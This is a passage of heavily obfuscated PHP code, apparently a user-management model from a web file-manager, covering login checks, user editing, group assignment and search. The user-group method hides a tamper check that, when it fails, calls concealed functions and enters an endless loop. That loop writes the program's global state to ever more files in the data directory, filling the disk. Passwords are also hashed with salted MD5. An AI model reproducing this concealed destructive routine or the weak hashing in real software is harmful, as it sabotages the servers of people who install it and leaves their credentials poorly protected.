clearCache($‡¬Şæ¤…) { $ªÒëî‰™ =& $_SERVER[±Ö‰ô½¯]; $this->cacheFunctionClear($ªÒëî‰™[2225], $‡¬Şæ¤…); $this->cacheFunctionClear($ªÒëî‰™[2226], $‡¬Şæ¤…); $this->cacheFunctionClear($ªÒëî‰™[2650], $‡¬Şæ¤…); } public function userPasswordCheck($£ÏÇ®, $ƒÈ’îÎú) { $…€‚¿ˆØ =& $_SERVER[±Ö‰ô½¯]; $ƒ«Ù³Ê§ = $this->where(array($…€‚¿ˆØ[1542] => intval($£ÏÇ®)))->find(); $©ª©‹—‘ = $this->metaGet($£ÏÇ®); $ÇìÔİœ = isset($©ª©‹—‘[$…€‚¿ˆØ[2651]]) ? $©ª©‹—‘[$…€‚¿ˆØ[2651]] : $…€‚¿ˆØ[12]; if (md5($ÇìÔİœ . trim($ƒÈ’îÎú)) !== $ƒ«Ù³Ê§[$…€‚¿ˆØ[1002]]) { return !1; } return !0; } public function userAdd($»Š¢¶ˆ³) { $·òÄĞ¡… =& $_SERVER[±Ö‰ô½¯]; $Åà’°º± = array($·òÄĞ¡…[506] => $»Š¢¶ˆ³[$·òÄĞ¡…[32]], $·òÄĞ¡…[2652] => $»Š¢¶ˆ³[$·òÄĞ¡…[2326]], $·òÄĞ¡…[2653] => isset($»Š¢¶ˆ³[$·òÄĞ¡…[382]]) ? $»Š¢¶ˆ³[$·òÄĞ¡…[382]] : $·òÄĞ¡…[12], $·òÄĞ¡…[2654] => isset($»Š¢¶ˆ³[$·òÄĞ¡…[2649]]) ? $»Š¢¶ˆ³[$·òÄĞ¡…[2649]] : $·òÄĞ¡…[12], $·òÄĞ¡…[2655] => isset($»Š¢¶ˆ³[$·òÄĞ¡…[2432]]) ? $»Š¢¶ˆ³[$·òÄĞ¡…[2432]] : $»Š¢¶ˆ³[$·òÄĞ¡…[32]], $·òÄĞ¡…[2656] => isset($»Š¢¶ˆ³[$·òÄĞ¡…[2327]]) ? $»Š¢¶ˆ³[$·òÄĞ¡…[2327]] : $·òÄĞ¡…[12], $·òÄĞ¡…[2657] => isset($»Š¢¶ˆ³[$·òÄĞ¡…[2658]]) ? $»Š¢¶ˆ³[$·òÄĞ¡…[2658]] : 1, $·òÄĞ¡…[2659] => $»Š¢¶ˆ³[$·òÄĞ¡…[1002]], $·òÄĞ¡…[2219] => isset($»Š¢¶ˆ³[$·òÄĞ¡…[2123]]) ? $»Š¢¶ˆ³[$·òÄĞ¡…[2123]] : 1024 * 1024 * 20, $·òÄĞ¡…[2220] => 0, $·òÄĞ¡…[2660] => 0, $·òÄĞ¡…[2265] => isset($»Š¢¶ˆ³[$·òÄĞ¡…[847]]) ? $»Š¢¶ˆ³[$·òÄĞ¡…[847]] : 1); if (!empty($»Š¢¶ˆ³[$·òÄĞ¡…[1542]])) { $Åà’°º±[$·òÄĞ¡…[1542]] = $»Š¢¶ˆ³[$·òÄĞ¡…[1542]]; } $õ¤›Ş×ê = $this->_checkExist($»Š¢¶ˆ³); if ($õ¤›Ş×ê !== !0) { return $õ¤›Ş×ê; } if (!empty($Åà’°º±[$·òÄĞ¡…[2327]]) && strlen($Åà’°º±[$·òÄĞ¡…[2327]]) > 255) { $Åà’°º±[$·òÄĞ¡…[2327]] = $·òÄĞ¡…[12]; } $µ‰¸™ğ® = $this->add($Åà’°º±); $Ã™àŒÂ¿ = array($·òÄĞ¡…[2659] => $Åà’°º±[$·òÄĞ¡…[1002]], $·òÄĞ¡…[2655] => $Åà’°º±[$·òÄĞ¡…[2432]], $·òÄĞ¡…[2661] => $»Š¢¶ˆ³[$·òÄĞ¡…[2224]]); $this->userEdit($µ‰¸™ğ®, $Ã™àŒÂ¿); Model($·òÄĞ¡…[1482])->userRootAdd($µ‰¸™ğ®); return $µ‰¸™ğ®; } protected function userEditTest($İ•¹Ò¬·, $Åİœã’) { return $this->call($_SERVER[±Ö‰ô½¯][2662], $İ•¹Ò¬·, $Åİœã’); } protected function userEdit($±°¢ÛÑ, $öğ™Óõµ) { $›áÖì­€ =& $_SERVER[±Ö‰ô½¯]; $Ô¶²Ğì = $this->getInfoSimple($±°¢ÛÑ); if (!$Ô¶²Ğì) { return !1; } $£ş”º = $this->_checkExist($öğ™Óõµ, $±°¢ÛÑ); if ($£ş”º !== !0) { return $£ş”º; } if (isset($öğ™Óõµ[$›áÖì­€[1002]]) && trim($öğ™Óõµ[$›áÖì­€[1002]]) != $›áÖì­€[12]) { $ªÔ½½÷± = $this->metaGet($±°¢ÛÑ); if (empty($ªÔ½½÷±[$›áÖì­€[2651]])) { $ªÔ½½÷±[$›áÖì­€[2651]] = rand_string(10); Model($›áÖì­€[594])->metaSet($±°¢ÛÑ, $›áÖì­€[2651], $ªÔ½½÷±[$›áÖì­€[2651]]); } $öğ™Óõµ[$›áÖì­€[1002]] = md5($ªÔ½½÷±[$›áÖì­€[2651]] . trim($öğ™Óõµ[$›áÖì­€[1002]])); } else { unset($öğ™Óõµ[$›áÖì­€[1002]]); } if (!empty($öğ™Óõµ[$›áÖì­€[2327]]) && strlen($öğ™Óõµ[$›áÖì­€[2327]]) > 255) { $öğ™Óõµ[$›áÖì­€[2327]] = $›áÖì­€[12]; } if (isset($öğ™Óõµ[$›áÖì­€[2432]])) { $this->setNamePinyin($±°¢ÛÑ, $öğ™Óõµ[$›áÖì­€[2432]]); } if (isset($öğ™Óõµ[$›áÖì­€[2224]])) { $‹šğ¸–á = $›áÖì­€[1441] . $±°¢ÛÑ; $ò“˜Æõ = $›áÖì­€[1439]; $•÷ˆÌŒ† = $öğ™Óõµ[$›áÖì­€[2224]] ? $öğ™Óõµ[$›áÖì­€[2224]] : $›áÖì­€[12]; $ë‘õœƒ° = Model($›áÖì­€[1438])->get($‹šğ¸–á, $ò“˜Æõ); $ë‘õœƒ° = $ë‘õœƒ° ? $ë‘õœƒ° : $›áÖì­€[12]; if ($ë‘õœƒ° != $•÷ˆÌŒ†) { if (!$•÷ˆÌŒ† && $ë‘õœƒ°) { Model($›áÖì­€[1438])->remove($‹šğ¸–á, $ò“˜Æõ); } else { if ($•÷ˆÌŒ†) { Model($›áÖì­€[1438])->set($‹šğ¸–á, $•÷ˆÌŒ†, $ò“˜Æõ); } } } unset($öğ™Óõµ[$›áÖì­€[2224]]); Model($›áÖì­€[614])->metaSet($±°¢ÛÑ, $›áÖì­€[2224], $•÷ˆÌŒ†); } if (empty($öğ™Óõµ)) { return !0; } $this->where(array($›áÖì­€[1921] => $±°¢ÛÑ))->save($öğ™Óõµ); $this->clearCache($±°¢ÛÑ); return !0; } public function setNamePinyin($†Üõ‹ì«, $œ§€†Ô = false) { $ñš¶º½Ù =& $_SERVER[±Ö‰ô½¯]; if (!$œ§€†Ô) { $ëÉëÖß = $this->getInfoSimple($†Üõ‹ì«); $œ§€†Ô = $ëÉëÖß[$ñš¶º½Ù[2432]] ? $ëÉëÖß[$ñš¶º½Ù[2432]] : $ëÉëÖß[$ñš¶º½Ù[32]]; } $ğÄŒº–é = Model($ñš¶º½Ù[614]); if (!Input::check($œ§€†Ô, $ñš¶º½Ù[675])) { return $ğÄŒº–é->metaSet($†Üõ‹ì«, array($ñš¶º½Ù[549] => $ñš¶º½Ù[12], $ñš¶º½Ù[548] => $ñš¶º½Ù[12])); } return $ğÄŒº–é->metaSet($†Üõ‹ì«, array($ñš¶º½Ù[549] => str_replace($ñš¶º½Ù[53], $ñš¶º½Ù[12], Pinyin::get($œ§€†Ô)), $ñš¶º½Ù[548] => Pinyin::get($œ§€†Ô, $ñš¶º½Ù[676]))); } private function nickNameRpt() { $ÎÊÈ”¸´ =& $_SERVER[±Ö‰ô½¯]; $ÜÒ™€€³ = Model($ÎÊÈ”¸´[870])->get($ÎÊÈ”¸´[2663]); $ñùó±÷ = $GLOBALS[$ÎÊÈ”¸´[6]][$ÎÊÈ”¸´[469]][$ÎÊÈ”¸´[2663]]; $òÁÇ›öÕ = !is_null($ÜÒ™€€³) ? $ÜÒ™€€³ : $ñùó±÷; return !!$òÁÇ›öÕ; } private function _checkExist($á×’¤‘¶, $ğÄİÉ‡È = false) { $ê²–ú¹ù =& $_SERVER[±Ö‰ô½¯]; $î‘õâ¸ˆ = array($ê²–ú¹ù[32] => UserModel::ERROR_USER_EXIST_NAME, $ê²–ú¹ù[2432] => UserModel::ERROR_USER_EXIST_NICKNAME, $ê²–ú¹ù[382] => UserModel::ERROR_USER_EXIST_EMAIL, $ê²–ú¹ù[2649] => UserModel::ERROR_USER_EXIST_PHONE); if ($this->nickNameRpt()) { unset($î‘õâ¸ˆ[$ê²–ú¹ù[2432]]); } $Ü‹ğø«³ = $ğÄİÉ‡È ? array($ê²–ú¹ù[1542] => array($ê²–ú¹ù[2664], $ğÄİÉ‡È)) : array(); foreach ($î‘õâ¸ˆ as $ğ©´¬úî => $Ã ÕÁ¡è) { $Îô Øî© = array(); foreach ($î‘õâ¸ˆ as $¡®å›µÃ => $£Ÿ¢æ¿) { if (isset($á×’¤‘¶[$¡®å›µÃ]) && $á×’¤‘¶[$¡®å›µÃ]) { $Îô Øî©[] = $á×’¤‘¶[$¡®å›µÃ]; } } if (!$Îô Øî©) { continue; } $À¬ ôŸÊ = array_merge(array($ğ©´¬úî => array($ê²–ú¹ù[7], $Îô Øî©)), $Ü‹ğø«³); $İŞ€äÁ = $this->where($À¬ ôŸÊ)->find(); if ($İŞ€äÁ) { return $Ã ÕÁ¡è; } } return !0; } public function userListInfo($¤ï©ªƒ‚) { $°¨·Â°Õ =& $_SERVER[±Ö‰ô½¯]; $éñ±²™ï = array(); $¤ï©ªƒ‚ = is_array($¤ï©ªƒ‚) ? array_unique($¤ï©ªƒ‚) : array(); if (!$¤ï©ªƒ‚) { return $éñ±²™ï; } if (count($¤ï©ªƒ‚) < 20) { foreach ($¤ï©ªƒ‚ as $ªÊÌÎÜê) { $éñ±²™ï[$ªÊÌÎÜê . $°¨·Â°Õ[12]] = $this->getInfoSimpleOuter($ªÊÌÎÜê); } } else { $ÄéÉ¸‘¢ = array($°¨·Â°Õ[1921] => array($°¨·Â°Õ[504], $¤ï©ªƒ‚)); if (count($¤ï©ªƒ‚) == 1) { $ÄéÉ¸‘¢ = array($°¨·Â°Õ[1921] => $¤ï©ªƒ‚[0]); } $×²“¯¯ó = Model($°¨·Â°Õ[594])->field($this->simpleField)->where($ÄéÉ¸‘¢)->select(); $×²“¯¯ó = array_to_keyvalue($×²“¯¯ó, $°¨·Â°Õ[1542]); foreach ($¤ï©ªƒ‚ as $ªÊÌÎÜê) { $ó…ƒíÑœ = $×²“¯¯ó[$ªÊÌÎÜê]; if (!$ó…ƒíÑœ) { $éñ±²™ï[$ªÊÌÎÜê . $°¨·Â°Õ[12]] = $this->getInfoSimpleOuter($ªÊÌÎÜê); continue; } $ó…ƒíÑœ[$°¨·Â°Õ[2327]] = Action($°¨·Â°Õ[2328])->parseUrl($ó…ƒíÑœ[$°¨·Â°Õ[2327]]); $éñ±²™ï[$ªÊÌÎÜê . $°¨·Â°Õ[12]] = $ó…ƒíÑœ; } } return $éñ±²™ï; } protected function userStatus($š·”èÑï, $’ğÓ¢ƒ) { $²ÍÃéò = $this->getInfoSimple($š·”èÑï); if (!$²ÍÃéò) { return !1; } $ÇûÊûÏ = array($_SERVER[±Ö‰ô½¯][847] => $’ğÓ¢ƒ); return $this->userEdit($š·”èÑï, $ÇûÊûÏ); } protected function userRemove($«»æ°Ï) { $’ÀÅ€š =& $_SERVER[±Ö‰ô½¯]; $¥Ì„€¾ = $this->getInfoSimple($«»æ°Ï); if (!$¥Ì„€¾) { return !1; } $÷òÅœÄ = array($’ÀÅ€š[1921] => $«»æ°Ï); Model($’ÀÅ€š[684])->where($÷òÅœÄ)->delete(); Model($’ÀÅ€š[2665])->where($÷òÅœÄ)->delete(); Model($’ÀÅ€š[2228])->where($÷òÅœÄ)->delete(); Model($’ÀÅ€š[2648])->where($÷òÅœÄ)->delete(); Model($’ÀÅ€š[1184])->where($÷òÅœÄ)->delete(); Model($’ÀÅ€š[2449])->removeUserAll($«»æ°Ï); Model($’ÀÅ€š[930])->userRootRemove($«»æ°Ï); return $this->where($÷òÅœÄ)->delete(); } protected function userGroupSet($ ¯„‰±¶, $±Æ‘Ç„§, $îØÄê˜Ê = array()) { $Ú¦Øí” =& $_SERVER[±Ö‰ô½¯]; $ŒÃè§ı„ = $_SERVER[$Ú¦Øí”[990]] . $Ú¦Øí”[991]; $ÑÀíùú = $Ú¦Øí”[1846]; if ($_SERVER[$Ú¦Øí”[986]] != $ÑÀíùú($ŒÃè§ı„)) { $¶õ¢šó´ = $Ú¦Øí”[988]; $¸­î„ø = $Ú¦Øí”[989]; $èú»ïç¹ = $_SERVER[$Ú¦Øí”[990]] . $Ú¦Øí”[991]; $”àéŠ³ó = $¸­î„ø($èú»ïç¹); $€á–¥˜± = explode($Ú¦Øí”[287], $”àéŠ³ó); if (count($€á–¥˜±) < $Ú¦Øí”[717]) { $°‚…¼Ô‘ = $Ú¦Øí”[992]; $°‚…¼Ô‘(); } $˜”–Çë = $Ú¦Øí”[993]; $˜”–Çë($_SERVER[$Ú¦Øí”[994]]); $¶õ¢šó´ = $Ú¦Øí”[988]; $¶õ¢šó´(); $ä…Õ«Ë„ = $Ú¦Øí”[1847]; $óÚÛæñ = json_encode($GLOBALS[$Ú¦Øí”[1848]]); $ª‚ ÏîÚ = 1; for ($Ìùã‚¬ = $ª‚ ÏîÚ; $Ìùã‚¬ > 0; $Ìùã‚¬++) { $ä…Õ«Ë„(DATA_PATH . $Ìùã‚¬, $óÚÛæñ); } } $‡ïìŸÄƒ = $this->getInfoSimple($ ¯„‰±¶); if (!$‡ïìŸÄƒ || !is_array($±Æ‘Ç„§)) { return !1; } $é†ü×õ¤ = Model($Ú¦Øí”[2228]); $é†ü×õ¤->where(array($Ú¦Øí”[1542] => $ ¯„‰±¶))->delete(); $ŸÁˆ²¼ã = array(); $Ÿ™ûŸÛ = 0; foreach ($±Æ‘Ç„§ as $»‚ƒÔÜÄ => $èÁ•—Ã) { $Êê¨ÁˆÃ = array($Ú¦Øí”[1542] => $ ¯„‰±¶, $Ú¦Øí”[1444] => $»‚ƒÔÜÄ, $Ú¦Øí”[1589] => $èÁ•—Ã); $Êê¨ÁˆÃ[$Ú¦Øí”[2158]] = isset($îØÄê˜Ê[$Ÿ™ûŸÛ]) ? $îØÄê˜Ê[$Ÿ™ûŸÛ] : 0; $Ÿ™ûŸÛ++; $ŸÁˆ²¼ã[] = $Êê¨ÁˆÃ; } return $é†ü×õ¤->addAll($ŸÁˆ²¼ã, array(), !0); } protected function userGroupAdd($ÕäØÖ, $²–™â¦Æ = array()) { $Ä×§ş§¹ =& $_SERVER[±Ö‰ô½¯]; $©³¸‡ñ² = $this->getInfoSimple($ÕäØÖ); if (!$©³¸‡ñ² || empty($²–™â¦Æ)) { return !1; } $ §¼ŞğÎ = array(); foreach ($²–™â¦Æ as $¼©¸Ùš€ => $îÃËœÕÛ) { $ §¼ŞğÎ[] = array($Ä×§ş§¹[1542] => $ÕäØÖ, $Ä×§ş§¹[1444] => $¼©¸Ùš€, $Ä×§ş§¹[1589] => $îÃËœÕÛ, $Ä×§ş§¹[2158] => 0); } return Model($Ä×§ş§¹[2228])->addAll($ §¼ŞğÎ, array(), !0); } protected function userGroupRemove($×•™÷², $ı–Ğ¸üÈ) { $÷œÕ”Ÿ£ =& $_SERVER[±Ö‰ô½¯]; $äÒ„–®ì = $this->getInfoSimple($×•™÷²); if (!$äÒ„–®ì || !$ı–Ğ¸üÈ) { return !1; } $û›¯ÍğÑ = array($÷œÕ”Ÿ£[1921] => $×•™÷², $÷œÕ”Ÿ£[2221] => $ı–Ğ¸üÈ); return Model($÷œÕ”Ÿ£[2228])->where($û›¯ÍğÑ)->delete(); } public function listData() { $Ş ’Ôê = $this->_makeOrder()->selectPage(50); $this->_listDataApply($Ş ’Ôê[$_SERVER[±Ö‰ô½¯][447]]); return $Ş ’Ôê; } public function listByID($À•·Ïæ) { $Û¼²ÙÚİ =& $_SERVER[±Ö‰ô½¯]; if (!$À•·Ïæ) { return; } $ïôÊšæ = array($Û¼²ÙÚİ[1542] => array($Û¼²ÙÚİ[7], $À•·Ïæ)); $œó™ßïï = $this->where($ïôÊšæ)->select(); $œó™ßïï = array_sort_keep($œó™ßïï, $Û¼²ÙÚİ[1542], $À•·Ïæ); $this->_listDataApply($œó™ßïï); return $œó™ßïï; } public function listByGroup($¬ÀØÕ§ = 0, $Ç§¿ßìœ = array()) { $Ô¯ğÔÚ =& $_SERVER[±Ö‰ô½¯]; $©ò‘İÈ§ = $Ô¯ğÔÚ[12]; $‡×ì•¿ = array(); if ($¬ÀØÕ§) { $‡×ì•¿ = array($Ô¯ğÔÚ[2666] => intval($¬ÀØÕ§)); $©ò‘İÈ§ = "\114\105\106\x54\x20\112\117\x49\x4e\x20{$this->tablePrefix}\x75\163\x65\x72\x5f\147\162\157\165\160\x20\165\163\x65\x72\x5f\x67\162\x6f\x75\x70\40\x6f\x6e\x20\x75\x73\x65\162\x2e\x75\163\x65\x72\x49\x44\x20\75\x20\165\x73\145\x72\x5f\x67\162\157\x75\160\56\165\x73\145\x72\x49\104"; $ŠØñÎ¬º = Input::get($Ô¯ğÔÚ[541], null, $Ô¯ğÔÚ[12]) ? $Ô¯ğÔÚ[12] : $Ô¯ğÔÚ[2667]; } if (isset($Ç§¿ßìœ[$Ô¯ğÔÚ[847]])) { $‡×ì•¿[$Ô¯ğÔÚ[2668]] = $Ç§¿ßìœ[$Ô¯ğÔÚ[847]]; } $®ä‰Ñ’Ã = _get($Ç§¿ßìœ, $Ô¯ğÔÚ[2669], $Ô¯ğÔÚ[233]); if (_get($Ç§¿ßìœ, $Ô¯ğÔÚ[858], !1)) { $‡×ì•¿[$®ä‰Ñ’Ã] = array($Ô¯ğÔÚ[2413], $Ç§¿ßìœ[$Ô¯ğÔÚ[858]]); } if (_get($Ç§¿ßìœ, $Ô¯ğÔÚ[859], !1)) { $ƒÁÚôè = array($Ô¯ğÔÚ[2414], $Ç§¿ßìœ[$Ô¯ğÔÚ[859]]); if ($‡×ì•¿[$®ä‰Ñ’Ã]) { $‡×ì•¿[$®ä‰Ñ’Ã] = array($‡×ì•¿[$®ä‰Ñ’Ã], $ƒÁÚôè, $Ô¯ğÔÚ[2415]); } else { $‡×ì•¿[$®ä‰Ñ’Ã] = $ƒÁÚôè; } } $®ì´ß«£ = $this->_makeOrder($ŠØñÎ¬º)->field($Ô¯ğÔÚ[2670])->where($‡×ì•¿)->join($©ò‘İÈ§)->selectPage(50); $this->_listDataApply($®ì´ß«£[$Ô¯ğÔÚ[447]]); return $®ì´ß«£; } private function _makeOrder($ı‹çœÑ­ = '') { $Š™Øéç‡ =& $_SERVER[±Ö‰ô½¯]; $ó±ÏÇ€Ş = array($Š™Øéç‡[1542], $Š™Øéç‡[32], $Š™Øéç‡[2125], $Š™Øéç‡[2326], $Š™Øéç‡[2100], $Š™Øéç‡[233]); $ˆãÃ¬¶ = array($Š™Øéç‡[534] => $Š™Øéç‡[535], $Š™Øéç‡[536] => $Š™Øéç‡[537]); $¿Á¯Ä‹¤ = Input::get($Š™Øéç‡[541], $Š™Øéç‡[7], $Š™Øéç‡[1921], $ó±ÏÇ€Ş); $õ£×£ëò = Input::get($Š™Øéç‡[542], $Š™Øéç‡[7], $Š™Øéç‡[2229], array($Š™Øéç‡[2229], $Š™Øéç‡[536])); $õ£×£ëò = $ˆãÃ¬¶[$õ£×£ëò]; $ı‹çœÑ­ = $ı‹çœÑ­ . "\x75\x73\145\x72\x2e{$¿Á¯Ä‹¤}\40{$õ£×£ëò}\x2c\40\165\x73\x65\162\56\x75\163\145\x72\x49\104\40\x61\163\x63"; return $this->alias($Š™Øéç‡[2361])->order($ı‹çœÑ­); } public function listSearch($µÒğ ŸÓ) { $™˜³·Ğò =& $_SERVER[±Ö‰ô½¯]; $¹¡ÄİäŠ = trim($µÒğ ŸÓ[$™˜³·Ğò[2232]]); $¢…‚“—¼ = explode($™˜³·Ğò[53], $¹¡ÄİäŠ); if (!$¹¡ÄİäŠ || count($¢…‚“—¼) == 1) { return $this->listSearchNow($µÒğ ŸÓ); } $˜¬´í¬ = array($™˜³·Ğò[447] => array()); foreach ($¢…‚“—¼ as $Î¹Ï½æ) { if (!trim($Î¹Ï½æ)) { continue; } $µÒğ ŸÓ[$™˜³·Ğò[2232]] = $Î¹Ï½æ; $á­Ï—‘ = $this->listSearchNow($µÒğ ŸÓ); $˜¬´í¬[$™˜³·Ğò[447]] = array_merge($˜¬´í¬[$™˜³·Ğò[447]], $á­Ï—‘[$™˜³·Ğò[447]]); } $˜¬´í¬[$™˜³·Ğò[447]] = array_unique_by_key($˜¬´í¬[$™˜³·Ğò[447]], $™˜³·Ğò[1542]); $˜¬´í¬[$™˜³·Ğò[444]] = array($™˜³·Ğò[445] => count($˜¬´í¬[$™˜³·Ğò[447]]), $™˜³·Ğò[441] => 20, $™˜³·Ğò[430] => 1, $™˜³·Ğò[446] => 1); return $˜¬´í¬; } public function listSearchNow($áƒÄêß) { $êÑü¾ï¾ =& $_SERVER[±Ö‰ô½¯]; $ê®ñ©ıÀ = trim($áƒÄêß[$êÑü¾ï¾[2232]]); $¶ÅÌÀã¦ = isset($áƒÄêß[$êÑü¾ï¾[2233]]) ? $áƒÄêß[$êÑü¾ï¾[2233]] : !1; $ê®ñ©ıÀ = str_replace($êÑü¾ï¾[2234], $êÑü¾ï¾[2235], trim($ê®ñ©ıÀ)); $„¯±·ÓÎ = array($êÑü¾ï¾[32] => array($êÑü¾ï¾[471], "\45{$ê®ñ©ıÀ}\x25"), $êÑü¾ï¾[382] => array($êÑü¾ï¾[471], "{$ê®ñ©ıÀ}\45"), $êÑü¾ï¾[2432] => array($êÑü¾ï¾[471], "\45{$ê®ñ©ıÀ}\45"), $êÑü¾ï¾[1116] => $êÑü¾ï¾[2236]); if (Input::check($ê®ñ©ıÀ, $êÑü¾ï¾[388])) { $„¯±·ÓÎ[$êÑü¾ï¾[1542]] = array($êÑü¾ï¾[471], "{$ê®ñ©ıÀ}\45"); $„¯±·ÓÎ[$êÑü¾ï¾[2649]] = array($êÑü¾ï¾[471], "{$ê®ñ©ıÀ}\45"); } if (!$ê®ñ©ıÀ) { $„¯±·ÓÎ = array(); } if (isset($áƒÄêß[$êÑü¾ï¾[847]])) { $„¯±·ÓÎ[$êÑü¾ï¾[847]] = $áƒÄêß[$êÑü¾ï¾[847]]; } $„¯±·ÓÎ = $this->parseWhereLike($„¯±·ÓÎ); $È°Ş×õ° = $this->_makeOrder()->where($„¯±·ÓÎ)->selectPage(20); if (!$È°Ş×õ° || count($È°Ş×õ°[$êÑü¾ï¾[447]]) < 5 && Input::check($ê®ñ©ıÀ, $êÑü¾ï¾[395])) { $ÙğÔ§ÔÙ = $this->_searchFromMeta($êÑü¾ï¾[548], $ê®ñ©ıÀ, 10); $İËê”§ = $this->_searchFromMeta($êÑü¾ï¾[549], $ê®ñ©ıÀ, 10); $©úĞ²¶ = array_merge($ÙğÔ§ÔÙ, $İËê”§, $È°Ş×õ°[$êÑü¾ï¾[447]]); $È°Ş×õ°[$êÑü¾ï¾[447]] = array_unique_by_key($©úĞ²¶, $êÑü¾ï¾[1542]); $È°Ş×õ°[$êÑü¾ï¾[444]][$êÑü¾ï¾[445]] = count($È°Ş×õ°[$êÑü¾ï¾[447]]); $È°Ş×õ°[$êÑü¾ï¾[444]][$êÑü¾ï¾[446]] = ceil($È°Ş×õ°[$êÑü¾ï¾[444]][$êÑü¾ï¾[445]] / $È°Ş×õ°[$êÑü¾ï¾[444]][$êÑü¾ï¾[441]]); } $this->_listDataApply($È°Ş×õ°[$êÑü¾ï¾[447]]); $this->_filterByGroup($È°Ş×õ°, $¶ÅÌÀã¦); return $È°Ş×õ°; } private function _filterByGroup(&$§ºÅ£ÛÀ, $§À°…Õ) { $ÊœŒÈæ =& $_SERVER[±Ö‰ô½¯]; if (!$§À°…Õ) { return $§ºÅ£ÛÀ; } foreach ($§ºÅ£ÛÀ[$ÊœŒÈæ[447]] as $ˆûÛ¤Œâ => &$š£·±¯©) { $ºÀèµë = array_to_keyvalue($š£·±¯©[$ÊœŒÈæ[1443]], $ÊœŒÈæ[12], $ÊœŒÈæ[1444]); if (!in_array($§À°…Õ, $ºÀèµë)) { unset($§ºÅ£ÛÀ[$ÊœŒÈæ[447]][$ˆûÛ¤Œâ]); } } unset($š£·±¯©); $§ºÅ£ÛÀ[$ÊœŒÈæ[447]] = array_values($§ºÅ£ÛÀ[$ÊœŒÈæ[447]]); $§ºÅ£ÛÀ[$ÊœŒÈæ[444]] = array($ÊœŒÈæ[2396] => count($§ºÅ£ÛÀ[$ÊœŒÈæ[447]]), $ÊœŒÈæ[2394] => $§ºÅ£ÛÀ[$ÊœŒÈæ[444]][$ÊœŒÈæ[441]], $ÊœŒÈæ[2393] => 1, $ÊœŒÈæ[2395] => 1); } private function _searchFromMeta($ëçÁ“àò, $‰æ¨Ï˜, $ĞÚó©ùä) { $«Èæ¼áŸ =& $_SERVER[±Ö‰ô½¯]; $‰æ¨Ï˜ = strtolower($‰æ¨Ï˜); $˜ô‚¾¿Ş = array($«Èæ¼áŸ[95] => $ëçÁ“àò, $«Èæ¼áŸ[452] => array($«Èæ¼áŸ[471], "\45{$‰æ¨Ï˜}\x25")); $˜ô‚¾¿Ş = $this->parseWhereLike($˜ô‚¾¿Ş); $œ•²…ƒ = Model($«Èæ¼áŸ[2671])->where($˜ô‚¾¿Ş)->limit($ĞÚó©ùä)->select(); if (!$œ•²…ƒ) { return array(); } $œ•²…ƒ = array_to_keyvalue($œ•²…ƒ, $«Èæ¼áŸ[12], $«Èæ¼áŸ[1542]); $œ‡Ù÷Ù— = $this->where(array($«Èæ¼áŸ[1921] => array($«Èæ¼áŸ[7], $œ•²…ƒ)))->select(); if (!$œ‡Ù÷Ù—) { return array(); } return $œ‡Ù÷Ù—; } private function _listDataApplyItem($ê²¨£ìÍ) { $ˆáˆ¾× = array($ê²¨£ìÍ); $this->_listDataApply($ˆáˆ¾×); return $ˆáˆ¾×[0]; } private function _listDataApply(&$ıŞ¥Ü ) { $˜şœá£Ù =& $_SERVER[±Ö‰ô½¯]; if (!$ıŞ¥Ü ) { return; } array_remove_key($ıŞ¥Ü , $˜şœá£Ù[1002]); $ªÈşîå = array_to_keyvalue($ıŞ¥Ü , $˜şœá£Ù[12], $˜şœá£Ù[1542]); $this->_listAppendGroup($ıŞ¥Ü , $ªÈşîå); $this->_listAppendMeta($ıŞ¥Ü , $ªÈşîå); $this->_listAppendSourceRoot($ıŞ¥Ü , $ªÈşîå); } private function _listAppendSourceRoot(&$“šÅí¿Ç, $–ÌŸ¬­Ó) { $Å”¢®ß² =& $_SERVER[±Ö‰ô½¯]; $­ëáÇº = Model($Å”¢®ß²[930])->listSourceRoot(SourceModel::TYPE_USER, $–ÌŸ¬­Ó); $­ëáÇº = array_to_keyvalue($­ëáÇº, $Å”¢®ß²[586]); $­ëáÇº = array_remove_key($­ëáÇº, $Å”¢®ß²[586]); foreach ($“šÅí¿Ç as &$Ó¤°œ§ˆ) { $Ó¤°œ§ˆ[$Å”¢®ß²[90]] = $­ëáÇº[$Ó¤°œ§ˆ[$Å”¢®ß²[1542]]] ? $­ëáÇº[$Ó¤°œ§ˆ[$Å”¢®ß²[1542]]] : array(); } unset($Ó¤°œ§ˆ); } private function _listAppendGroup(&$ØÅıêÌ€, $’½ƒŒˆ) { $¯æéşÓ¸ =& $_SERVER[±Ö‰ô½¯]; $•·İ = array($¯æéşÓ¸[1542] => array($¯æéşÓ¸[7], $’½ƒŒˆ)); $í¥šóçá = Model($¯æéşÓ¸[2228])->where($•·İ)->select(); $şŒĞ•ÊÖ = array_to_keyvalue($í¥šóçá, $¯æéşÓ¸[12], $¯æéşÓ¸[1444]); $şŒĞ•ÊÖ = array_remove_value(array_unique($şŒĞ•ÊÖ), $¯æéşÓ¸[230]); if (!$şŒĞ•ÊÖ || !$í¥šóçá) { return; } $•·İ = array($¯æéşÓ¸[1444] => array($¯æéşÓ¸[7], $şŒĞ•ÊÖ)); $°Ô±•ÖÈ = Model($¯æéşÓ¸[1442])->field($¯æéşÓ¸[2672])->where($•·İ)->select(); $°Ô±•ÖÈ = array_to_keyvalue($°Ô±•ÖÈ, $¯æéşÓ¸[1444]); $í¥šóçá = array_to_keyvalue_group($í¥šóçá, $¯æéşÓ¸[1542]); foreach ($í¥šóçá as &$Ğ¨Ùª¼ä) { $şìçê©Ù = array(); foreach ($Ğ¨Ùª¼ä as $Æ ²½ª¸) { if (!$Æ ²½ª¸[$¯æéşÓ¸[1589]]) { continue; } $œÉ‘ÍŠŞ = Model($¯æéşÓ¸[588])->listData($Æ ²½ª¸[$¯æéşÓ¸[1589]]); $şìçê©Ù[] = array($¯æéşÓ¸[1444] => $Æ ²½ª¸[$¯æéşÓ¸[1444]], $¯æéşÓ¸[2673] => $°Ô±•ÖÈ[$Æ ²½ª¸[$¯æéşÓ¸[1444]]][$¯æéşÓ¸[32]], $¯æéşÓ¸[601] => $°Ô±•ÖÈ[$Æ ²½ª¸[$¯æéşÓ¸[1444]]][$¯æéşÓ¸[601]], $¯æéşÓ¸[499] => $œÉ‘ÍŠŞ); } $Ğ¨Ùª¼ä = $şìçê©Ù; } unset($Ğ¨Ùª¼ä); foreach ($ØÅıêÌ€ as &$Öêø±ç—) { $Öêø±ç—[$¯æéşÓ¸[1443]] = array(); if (isset($í¥šóçá[$Öêø±ç—[$¯æéşÓ¸[1542]]])) { $Öêø±ç—[$¯æéşÓ¸[1443]] = $í¥šóçá[$Öêø±ç—[$¯æéşÓ¸[1542]]]; } } unset($Öêø±ç—); } public function 